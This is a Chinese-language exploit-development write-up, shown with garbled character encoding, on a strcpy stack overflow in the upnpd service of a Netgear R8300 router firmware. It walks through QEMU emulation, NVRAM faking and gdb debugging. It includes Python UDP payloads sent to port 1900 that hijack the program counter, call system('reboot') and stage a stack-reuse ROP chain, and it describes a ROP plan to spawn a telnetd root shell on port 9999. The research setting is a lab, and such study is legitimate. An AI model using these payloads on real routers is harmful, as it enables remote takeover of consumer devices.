410160c4nvram_init: Unable to touch Ralink PID file: /var/run/nvramd.pid!sem_get: Key: 410c0019nvram_set_default_builtin: Setting built-in default values!nvram_set: console_loglevel = &quot;7&quot;sem_get: Key: 410c0019sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...sem_lock: Unable to get semaphore! Qemuè‡ªå®šä¹‰ é…ç½®armè™šæ‹Ÿæœº ä½¿ç”¨Qemuæ¨¡æ‹Ÿå›ºä»¶éœ€è¦ä¸‹è½½å¯¹åº”çš„armè™šæ‹Ÿæœºé•œåƒï¼Œå†…æ ¸å’Œinitrdã€‚https://people.debian.org/~aurel32/qemu/armhf/ 123[debian_wheezy_armhf_desktop.qcow2](https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_desktop.qcow2) 2013-12-17 02:43 1.7G [debian_wheezy_armhf_standard.qcow2](https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2) 2013-12-17 00:04 229M [initrd.img-3.2.0-4-vexpress](https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress) 2013-12-17 01:57 2.2M [vmlinuz-3.2.0-4-vexpress](https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress) 2013-09-20 18:33 1.9M æ ‡å‡†çš„è™šæ‹Ÿæœºå¯åŠ¨å‘½ä»¤ä¸º 12- qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2&quot;- qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_desktop.qcow2 -append &quot;root=/dev/mmcblk0p2&quot; å¯¹äºR8300å›ºä»¶ï¼Œåœ¨ Host æœºä¸Šåˆ›å»ºä¸€ä¸ª tap æ¥å£å¹¶åˆ†é… IPï¼Œå¯åŠ¨è™šæ‹Ÿæœºï¼š 123`sudo tunctl -t tap0 -u `whoami`sudo ifconfig tap0 192.168.2.1/24qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic` ä¸æ ‡å‡†å‘½ä»¤åŒºåˆ«åœ¨äº-net nic -net tap,ifname=tap0,script=no,downscript=no -nographicå¯åŠ¨ä¹‹åè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œéƒ½æ˜¯ rootï¼Œä¸ºè™šæ‹Ÿæœºåˆ†é… IPï¼š 1`root@debian-armhf:~# ifconfig eth0 ``192.168``.``2.2``/``24` è¿™æ · Host å’Œè™šæ‹Ÿæœºå°±ç½‘ç»œäº’é€šäº†ï¼Œç„¶åæŒ‚è½½ procã€devï¼Œæœ€å chroot å³å¯ã€‚ 123`root@debian-armhf:~# mount -t proc /proc ./squashfs-root/procroot@debian-armhf:~# mount -o bind /dev ./squashfs-root/devroot@debian-armhf:~# chroot ./squashfs-root/ sh` ä¿®å¤ä¾èµ– NVRAM( éæ˜“å¤±æ€§ RAM) ç”¨äºå­˜å‚¨è·¯ç”±å™¨çš„é…ç½®ä¿¡æ¯ï¼Œè€Œ upnpd è¿è¡Œæ—¶éœ€è¦ç”¨åˆ°å…¶ä¸­éƒ¨åˆ†é…ç½®ä¿¡æ¯ã€‚åœ¨æ²¡æœ‰ç¡¬ä»¶è®¾å¤‡çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ LD_PRELOAD åŠ«æŒä»¥ä¸‹å‡½æ•°ç¬¦å·ã€‚æ‰‹åŠ¨åˆ›å»º /tmp/var/run ç›®å½•ï¼Œå†æ¬¡è¿è¡Œæç¤ºç¼ºå°‘ /dev/nvramã€‚ ç¼–è¯‘nvram.so https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c 1$ arm-linux-gcc -Wall -fPIC -shared nvram.c -o nvram.so åŠ«æŒdlsym nvramåº“çš„å®ç°è€…è¿˜åŒæ—¶ hook äº† systemã€fopenã€open ç­‰å‡½æ•°ï¼Œå› æ­¤è¿˜ä¼šç”¨åˆ° dlsymï¼Œ/lib/libdl.so.0å¯¼å‡ºäº†è¯¥ç¬¦å·ã€‚ 123456789101112`$ grep ``-``r ``&quot;dlsym&quot;`` ``.``Binary`` file ``./``lib``/``libcrypto``.``so``.``1.0``.``0`` matches``Binary`` file ``./``lib``/``libdl``.``so``.``0`` matches``Binary`` file ``./``lib``/``libhcrypto``-``samba4``.``so``.``5`` matches``Binary`` file ``./``lib``/``libkrb5``-``samba4``.``so``.``26`` matches``Binary`` file ``./``lib``/``libldb``.``so``.``1`` matches``Binary`` file ``./``lib``/``libsamba``-``modules``-``samba4``.``so matches``Binary`` file ``./``lib``/``libsqlite3``.``so``.``0`` matches``grep``:`` ``./``lib``/``modules``/``2.6``.``36.4brcmarm``+:`` ``No`` such file ``or`` directory`$ `readelf ``-``a `**`./``lib``/``libdl``.``so``.`**`**0**`` ``|`` grep dlsym`` ``26``:`` ``000010f0`` ``296`` FUNC GLOBAL DEFAULT ``7`` dlsym` é…ç½®tmp/nvram.iniä¿¡æ¯ æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯æ ¹æ®ä¸Šé¢çš„æ—¥å¿—è¡¥å…¨é…ç½®ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥å‚è€ƒhttps://github.com/zcutlip/nvram-faker/blob/master/nvram.iniã€‚è‡³äºä¸ºä»€ä¹ˆè¿™ä¹ˆè®¾ç½®ï¼Œå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„æ±‡ç¼–ä»£ç é€»è¾‘ï¼ˆé…ç½®çš„æœ‰é—®é¢˜çš„è¯å¾ˆå®¹æ˜“è§¦å‘æ®µé”™è¯¯ï¼‰ã€‚ 1234567891011121314`upnpd_debug_level=9lan_ipaddr=192.168.2.2hwver=R8500friendly_name=R8300upnp_enable=1upnp_turn_on=1upnp_advert_period=30upnp_advert_ttl=4upnp_portmap_entry=1upnp_duration=3600upnp_DHCPServerConfigurable=1wps_is_upnp=0upnp_sa_uuid=00000000000000000000lan_hwaddr=AA:BB:CC:DD:EE:FF` è¿è¡Œè¿‡ç¨‹ 12345678910111213141516171819202122232425262728293031323334353637**# ./usr/sbin/upnpd**# /dev/nvram: No such file or directory/dev/nvram: No such file or directory/dev/nvram: No such file or directory/dev/nvram: No such file or directory/dev/nvram: No such file or directory/dev/nvram: No such file or directory/dev/nvram: No such file or directory/dev/nvram: No such file or directory/dev/nvram: No such file or directory/dev/nvram: No such file or directory/dev/nvram: No such file or directory**# LD_PRELOAD=&quot;./nvram.so&quot; ./usr/sbin/upnpd**# ./usr/sbin/upnpd: can&apos;t resolve symbol &apos;dlsym&apos;**# LD_PRELOAD=&quot;./nvram.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd**# [0x00026460] fopen(&apos;/var/run/upnpd.pid&apos;, &apos;wb+&apos;) = 0x00b19008[0x0002648c] custom_nvram initialised[0x76eb7cb8] **fopen****(&apos;/tmp/nvram.ini&apos;, &apos;r&apos;) = 0x00b19008**[nvram 0] upnpd_debug_level = 9[nvram 1] lan_ipaddr = 192.168.2.2[nvram 2] hwver = R8500[nvram 3] friendly_name = R8300[nvram 4] upnp_enable = 1[nvram 5] upnp_turn_on = 1[nvram 6] upnp_advert_period = 30[nvram 7] upnp_advert_ttl = 4[nvram 8] upnp_portmap_entry = 1[nvram 9] upnp_duration = 3600[nvram 10] upnp_DHCPServerConfigurable = 1[nvram 11] wps_is_upnp = 0[nvram 12] upnp_sa_uuid = 00000000000000000000[nvram 13] lan_hwaddr = AA:BB:CC:DD:EE:FF[nvram 14] lan_hwaddr =Read 15 entries from /tmp/nvram.iniacosNvramConfig_get(&apos;upnpd_debug_level&apos;) = &apos;9&apos; 0x03 é™æ€åˆ†æè¯¥æ¼æ´çš„åŸç†æ˜¯ä½¿ç”¨strcpyå‡½æ•°ä¸å½“ï¼Œæ‹·è´è¿‡é•¿å­—ç¬¦å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºï¼Œé‚£ä¹ˆå¦‚ä½•åˆ°è¾¾æº¢å‡ºä½ç½®ã€‚é¦–å…ˆupnpdæœåŠ¡åœ¨sub_1D020() ä¸­ä½¿ç”¨recvfrom()ä»å¥—æ¥å­—æ¥æ”¶UDPæ•°æ®åŒ…ï¼Œå¹¶æ•è·æ•°æ®å‘é€æºçš„åœ°å€ã€‚ä»å‡½æ•°å®šä¹‰å¯çŸ¥ï¼Œupnpdæ¥æ”¶äº†é•¿åº¦ä¸º0x1FFFFå¤§å°çš„æ•°æ®åˆ°ç¼“å†²åŒºv54 recvfrom recvfromå‡½æ•°(ç»socketæ¥æ”¶æ•°æ®): å‡½æ•°åŸå‹:int recvfrom(SOCKET s,void *buf,int len,unsigned int flags, struct sockaddr from,int fromlen); ç›¸å…³å‡½æ•° recvï¼Œrecvmsgï¼Œsendï¼Œsendtoï¼Œsocket å‡½æ•°è¯´æ˜:recv()ç”¨æ¥æ¥æ”¶è¿œç¨‹ä¸»æœºç»æŒ‡å®šçš„socketä¼ æ¥çš„æ•°æ®,å¹¶æŠŠæ•°æ®ä¼ åˆ°ç”±å‚æ•°bufæŒ‡å‘çš„å†…å­˜ç©ºé—´,å‚æ•°lenä¸ºå¯æ¥æ”¶æ•°æ®çš„æœ€å¤§é•¿åº¦.å‚æ•°flagsä¸€èˆ¬è®¾0,å…¶ä»–æ•°å€¼å®šä¹‰å‚è€ƒrecv().å‚æ•°fromç”¨æ¥æŒ‡å®šæ¬²ä¼ é€çš„ç½‘ç»œåœ°å€,ç»“æ„sockaddrè¯·å‚è€ƒbind()å‡½æ•°.å‚æ•°fromlenä¸ºsockaddrçš„ç»“æ„é•¿åº¦. åœ¨ sub_25E04() ä¸­è°ƒç”¨ strcpy() å°†ä»¥ä¸Šæ•°æ®æ‹·è´åˆ°å¤§å°ä¸º 0x634 - 0x58 = 0x5dc çš„ bufferã€‚å¦‚æœè¶…è¿‡ç¼“å†²åŒºå¤§å°ï¼Œæ•°æ®å°±ä¼šè¦†ç›–æ ˆåº•éƒ¨åˆ†ç”šè‡³è¿”å›åœ°å€ã€‚ 1234567891011121314` ``+-----------------+`` ``|`` retaddr ``|`` ``+-----------------+`` ``|`` saved ebp ``|`` ebp``---&gt;+-----------------+`` ``|`` ``|`` ``|`` ``| | | s,ebp-0x58--&gt;+-----------------+`` ``|`` ``|`` ``|`` buffer ``|`` ``|`` ``|`` ``|`` ``|`` v40``,``ebp``-``0x634``--&gt;+-----------------+` 0x04 åŠ¨æ€è°ƒè¯•ä½¿ç”¨gdbserverè°ƒè¯•ç›®æ ‡ç¨‹åºhttps://res.cloudinary.com/dozyfkbg3/raw/upload/v1568965448/gdbserver 123456# ps|grep upnp 2714 0 3324 S ./usr/sbin/upnpd 2788 0 1296 S grep upnp# ./gdbserver 127.0.0.1:12345 --attach 2714Attached; pid = 2714Listening on port 12345 å·¥ä½œæœºä¸Šä½¿ç”¨è·¨å¹³å°è¯•gdb-multiarchgdb-multiarch -x dbgscriptdbgscript å†…å®¹ 1234`set`` architecture arm``gef``-``remote ``-``q ``192.168``.2``.1``:``12345``file usr``/``sbin``/``upnpd``set`` remote ``exec``-``file ``/``usr``/``sbin``/upnpd` ç›´æ¥æ„é€ æº¢å‡ºå­—ç¬¦ï¼Œç¨‹åºä¸ä¼šæ­£å¸¸è¿”å›ï¼Œå› ä¸ºæ ˆä¸Šå­˜åœ¨ä¸€ä¸ªv40çš„æŒ‡é’ˆv51ï¼Œéœ€è¦è¦†ç›–ä¸ºæœ‰æ•ˆåœ°å€æ‰èƒ½æ­£ç¡®è¿”å›ã€‚ 123456789101112131415#!/usr/bin/python3import socketimport structp32 = lambda x: struct.pack(&quot;&lt;L&quot;, x)s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)payload = ( 0x634 * b&apos;a&apos; + p32(0x43434343))print(payload)s.connect((&apos;192.168.2.2&apos;, 1900))s.send(payload)s.close() 12345678910111213141516#!/usr/bin/python3import socketimport structp32 = lambda x: struct.pack(&quot;&lt;L&quot;, x)s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)payload = ( 0x604 * b&apos;a&apos; + # dummy p32(0x7e2da53c) + # v51 (0x634 - 0x604 - 8) * b&apos;a&apos; + # dummy p32(0x43434343) # LR)s.connect((&apos;192.168.2.2&apos;, 1900))s.send(payload)s.close() å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å‘è¿”å›åœ°å€å‘é€çš„æ•°æ®ä¸º0x43434343ï¼Œä½†æœ€åPCå¯„å­˜å™¨çš„å€¼ä¸º0x43434342ï¼Œæœ€åä¸€ä¸ªbitå˜ä¸º0ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿhttps://blog.3or.de/arm-exploitation-defeating-dep-executing-mprotect.html é¦–å…ˆæº¢å‡ºè¦†ç›–äº†éå¶å‡½æ•°çš„è¿”å›åœ°å€ã€‚ä¸€æ—¦è¿™ä¸ªå‡½æ•°æ‰§è¡Œå®ƒçš„ç»“æŸè¯­æ¥æ¢å¤ä¿å­˜çš„å€¼ï¼Œä¿å­˜çš„LRå°±è¢«å¼¹å‡ºåˆ°PCä¸­è¿”å›ç»™è°ƒç”¨è€…ã€‚ å…¶æ¬¡å…³äºæœ€ä½æœ‰æ•ˆä½çš„ä¸€ä¸ªæ³¨æ„äº‹é¡¹ï¼šBXæŒ‡ä»¤å°†åŠ è½½åˆ°PCçš„åœ°å€çš„LSBå¤åˆ¶åˆ°CPSRå¯„å­˜å™¨çš„TçŠ¶æ€ä½ï¼ŒCPSRå¯„å­˜å™¨åœ¨ARMå’ŒThumbæ¨¡å¼ä¹‹é—´åˆ‡æ¢ï¼šARMï¼ˆLSB=0ï¼‰/Thumbï¼ˆLSB=1ï¼‰ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°R7300æ˜¯è¿è¡Œåœ¨THUMBçŠ¶æ€ å½“å¤„ç†å™¨å¤„äºARMçŠ¶æ€æ—¶ï¼Œæ¯æ¡ARMæŒ‡ä»¤ä¸º4ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥PCå¯„å­˜å™¨çš„å€¼ä¸ºå½“å‰æŒ‡ä»¤åœ°å€ + 8å­—èŠ‚ å½“å¤„ç†å™¨å¤„äºThumbçŠ¶æ€æ—¶ï¼Œæ¯æ¡ThumbæŒ‡ä»¤ä¸º2å­—èŠ‚ï¼Œæ‰€ä»¥PCå¯„å­˜å™¨çš„å€¼ä¸ºå½“å‰æŒ‡ä»¤åœ°å€ + 4å­—èŠ‚ å› æ­¤ä¿å­˜çš„LRï¼ˆç”¨0x43434343è¦†ç›–ï¼‰è¢«å¼¹å‡ºåˆ°PCä¸­ï¼Œç„¶åå¼¹å‡ºåœ°å€çš„LSBè¢«å†™å…¥CPSRå¯„å­˜å™¨Tä½ï¼ˆä½5ï¼‰ï¼Œæœ€åPCæœ¬èº«çš„LSBè¢«è®¾ç½®ä¸º0ï¼Œä»è€Œäº§ç”Ÿ0x43434342ã€‚ æœ€åæ£€æŸ¥ç¨‹åºçš„ç¼“è§£æªæ–½ã€‚ç¨‹åºæœ¬èº«å¼€å¯äº†NXï¼Œä¹‹å‰ç”¨è¿‡R7000çš„çœŸæœºï¼Œè®¾å¤‡å¼€äº†ASLRåœ¨å †æ ˆæ¢å¤å‰ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œè§‚å¯Ÿæ§åˆ¶æµè½¬ç§»æƒ…å†µï¼Œå°†PCæŒ‡é’ˆæ§åˆ¶ä¸ºé‡å¯æŒ‡ä»¤ã€‚é€šè¿‡ hook çš„æ—¥å¿—å¯ä»¥çœ‹åˆ°ï¼ŒROP åˆ©ç”¨é“¾æŒ‰ç…§é¢„æœŸå·¥ä½œï¼ˆç”±äºæ¨¡æ‹Ÿç¯å¢ƒçš„é—®é¢˜ï¼Œreboot å‘½ä»¤è¿è¡Œæ®µé”™è¯¯äº†â€¦ï¼‰ 12345678910111213141516171819202122232425gefâ¤ b *0x00025F40Breakpoint 1 at 0x25f40.text:00025F40 ADD SP, SP, #0x234.text:00025F44 ADD SP, SP, #0x400.text:00025F48 LDMFD SP!, &#123;R4-R11,PC&#125;**.****text****:****0003E9DC** **** LDR R0, =aReboot_0 ; &quot;reboot&quot;.text:0003E9E0 BL system**payloadå¦‚ä¸‹ï¼š**payload = ( 0x604 * b&apos;a&apos; + # dummy p32(0x76d9d450) + # v41 (0x634 - 0x604 - 8) * b&apos;a&apos; + # dummy p32(0x0003E9DC) # system(reboot))**å›ºä»¶æ¨¡æ‹Ÿæ—¥å¿—ï¼š**ssdp_http_method_check(203):ssdp_http_method_check(231):Http message errorDetaching from process 3477rmmod: dhd.ko: No such file or directory**reboot: rmmod dhd failed: No such file or directory****[0x0003e9e4] system(&apos;reboot&apos;) = 0** ç»¼åˆç›®å‰çš„æƒ…å†µï¼š ç›®å‰å¯ä»¥æ§åˆ¶R4 - R11 ä»¥åŠ PC(R15)å¯„å­˜å™¨ å¼€äº† NX ä¸èƒ½ç”¨åœ¨æ ˆä¸Šå¸ƒç½®shellcodeã€‚ æœ‰ ASLRï¼Œä¸èƒ½æ³„æ¼åœ°å€ï¼Œä¸èƒ½ä½¿ç”¨å„ç§ LIB åº“ä¸­çš„ç¬¦å·å’Œ gadgetã€‚ strcpy() å‡½æ•°å¯¼è‡´çš„æº¢å‡ºï¼Œpayload ä¸­ä¸èƒ½åŒ…å« \\x00 å­—ç¬¦ã€‚ 0x05 æ¼æ´åˆ©ç”¨è·¯ç”±å™¨å·²å¯ç”¨ASLRç¼“è§£åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ROPæ”»å‡»ç»•è¿‡è¯¥åŠŸèƒ½ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬é€šè¿‡ä½¿ç”¨å¯¹NULLå­—èŠ‚æ•æ„Ÿçš„strcpyæ¥æ‰§è¡Œå¤åˆ¶è°ƒç”¨ï¼Œè¿™åè¿‡æ¥åˆä¼šé˜»æ­¢æˆ‘ä»¬ä½¿ç”¨ROPæ”»å‡»ã€‚å› æ­¤ï¼Œè¦åˆ©ç”¨åŒ…å«NULLå­—èŠ‚çš„åœ°å€ï¼Œæˆ‘ä»¬å°†éœ€è¦ä½¿ç”¨å †æ ˆé‡ç”¨æ”»å‡»ã€‚å³æƒ³åŠæ³•æå‰å°† ROP payload æ³¨å…¥ç›®æ ‡å†…å­˜ã€‚ï¼ˆstack reuseï¼‰æ³¨æ„åˆ°recvfromå‡½æ•°åœ¨æ¥æ”¶ socket æ•°æ®æ—¶ buffer æœªåˆå§‹åŒ–ï¼Œåˆ©ç”¨å†…å­˜æœªåˆå§‹åŒ–é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å‘sub_1D020çš„å †æ ˆä¸­å¸ƒç½®gadgetsã€‚æ„é€ å¦‚ä¸‹ PoCï¼Œæ¯ä¸ª payload å‰æ·»åŠ  \\x00 é˜²æ­¢ç¨‹åºå´©æºƒï¼ˆstrcpyé‡åˆ°\\x00æˆªæ–­ï¼Œä¸ä¼šæ‹·è´åé¢éƒ¨åˆ†ï¼‰ã€‚ 123456789#!/usr/bin/python3import socketimport structs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)s.connect((&apos;192.168.2.2&apos;, 1900))s.send(b&apos;\\x00&apos; + b&apos;A&apos; * 0x1ff0)s.send(b&apos;\\x00&apos; + b&apos;B&apos; * 0x633)s.close() åœ¨strcpyä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œå¹¶æ£€æŸ¥æ ˆåŒºå†…å­˜ 12345678910111213141516171819202122gefâ¤ info bNum Type Disp Enb Address What1 breakpoint keep y 0x76dd6e48 &lt;recvfrom+4&gt;2 breakpoint keep y 0x76dc350c &lt;strcpy+4&gt;4 breakpoint keep y 0x00025e705 breakpoint keep y 0x00025e74gefâ¤ search-pattern BBBB[+] Searching &apos;BBBB&apos; in memory[+] In &apos;/lib/libc.so.0&apos;(0x76d85000-0x76dea000), permission=r-x 0x76de17e4 - 0x76de17e8 â†’ &quot;BBBB[...]&quot; 0x76de1ecc - 0x76de1edb â†’ &quot;BBBBBBBBCCCCCCC&quot; 0x76de1ed0 - 0x76de1edb â†’ &quot;BBBBCCCCCCC&quot;[+] In &apos;[stack]&apos;(0x7eb36000-0x7eb6f000), permission=rw- **0x7eb6cc75** - 0x7eb6ccac â†’ &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]&quot; 0x7eb6cc79 - 0x7eb6ccb0 â†’ &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]&quot; 0x7eb6cc7d - 0x7eb6ccb4 â†’ &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]&quot; 0x7eb6cc81 - 0x7eb6ccb8 â†’ &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]&quot; 0x7eb6cc85 - 0x7eb6ccbc â†’ &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]&quot;gefâ¤ x/s 0x7eb6cc750x7eb6cc75: &apos;B&apos; &lt;repeats 1587 times&gt;gefâ¤ x/s 0x7eb6cc75+15880x7eb6d2a9: &apos;A&apos; &lt;repeats 6588 times&gt; æ­¤æ—¶ç¨‹åºä¸Šä¸‹æ–‡ä¸º 123456789101112131415161718192021222324252627282930313233343536373839404142434445gefâ¤ context[ Legend: Modified register | Code | Heap | Stack | String ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€$r0 : 0x7eb6c5fc â†’ 0x00000000**$r1 : 0x7eb6cc74** â†’ 0x42424200$r2 : 0x1d $r3 : 0x7eb6c5fc â†’ 0x00000000**$r4 : 0x7eb6cc74** â†’ 0x42424200$r5 : 0x0000cf02 â†’ blx 0x10c6586$r6 : 0x7eb6ecf4 â†’ &quot;192.168.2.1&quot;$r7 : 0x7eb6cc00 â†’ 0x7eb6c5fc â†’ 0x00000000$r8 : 0x7eb6cc04 â†’ 0x76f10020 â†’ 0x00000000$r9 : 0x3eaf $r10 : 0x1 $r11 : 0x000c4584 â†’ 0x00000005$r12 : 0x00055450 â†’ 0x76dc3508 â†’ &lt;strcpy+0&gt; mov r3, r0$sp : 0x7eb6c5d8 â†’ &quot;nnection:1&quot;$lr : 0x00025e74 â†’ mov r0, r7$pc : 0x76dc350c â†’ &lt;strcpy+4&gt; ldrb r2, [r1], #1$cpsr: [NEGATIVE zero carry overflow interrupt fast thumb]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€0x7eb6c5d8â”‚+0x0000: &quot;nnection:1&quot; â† $sp0x7eb6c5dcâ”‚+0x0004: &quot;tion:1&quot;0x7eb6c5e0â”‚+0x0008: 0x0000313a (&quot;:1&quot;?)0x7eb6c5e4â”‚+0x000c: 0x000000000x7eb6c5e8â”‚+0x0010: 0x000000000x7eb6c5ecâ”‚+0x0014: 0x000000000x7eb6c5f0â”‚+0x0018: 0x000000000x7eb6c5f4â”‚+0x001c: 0x00000000â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ code:arm:ARM â”€â”€â”€â”€ 0x76dc3500 &lt;strchrnul+24&gt; bne 0x76dc34f0 &lt;strchrnul+8&gt; 0x76dc3504 &lt;strchrnul+28&gt; bx lr 0x76dc3508 &lt;strcpy+0&gt; mov r3, r0 â†’ 0x76dc350c &lt;strcpy+4&gt; ldrb r2, [r1], #1 0x76dc3510 &lt;strcpy+8&gt; cmp r2, #0 0x76dc3514 &lt;strcpy+12&gt; strb r2, [r3], #1 0x76dc3518 &lt;strcpy+16&gt; bne 0x76dc350c &lt;strcpy+4&gt; 0x76dc351c &lt;strcpy+20&gt; bx lr 0x76dc3520 &lt;strcspn+0&gt; push &#123;r4, lr&#125;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ threads â”€â”€â”€â”€[#0] Id 1, Name: &quot;upnpd&quot;, stopped, reason: BREAKPOINTâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€[#0] 0x76dc350c â†’ strcpy()[#1] 0x25e74 â†’ mov r0, r7â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ç”±äºæ¥æ”¶ socket æ•°æ®çš„ buffer æœªåˆå§‹åŒ–ï¼Œåœ¨åŠ«æŒ PC å‰æˆ‘ä»¬å¯ä»¥å¾€ç›®æ ‡å†…å­˜æ³¨å…¥ 6500 å¤šå­—èŠ‚çš„æ•°æ®ã€‚ è¿™ä¹ˆå¤§çš„ç©ºé—´ï¼Œä¹Ÿè¶³ä»¥ç»™ ROP çš„ payload ä¸€ç‰‡å®¹èº«ä¹‹åœ°ã€‚ ä½¿ç”¨ strcpy è°ƒç”¨åœ¨ bss ä¸Šæ‹¼æ¥å‡ºå‘½ä»¤å­—ç¬¦ä¸² telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&amp;\\x20\\x00ï¼Œå¹¶è°ƒæ•´ R0 æŒ‡å‘è¿™æ®µå†…å­˜ï¼Œç„¶åè·³è½¬ system æ‰§è¡Œå³å¯ã€‚ 0x06 è„šæœ¬ä½¿ç”¨è¯´æ˜ è„šæœ¬å¸®åŠ©ï¼š usage: python2 PSV-2020-0211.py ã€è·¯ç”±å™¨IPã€‘ 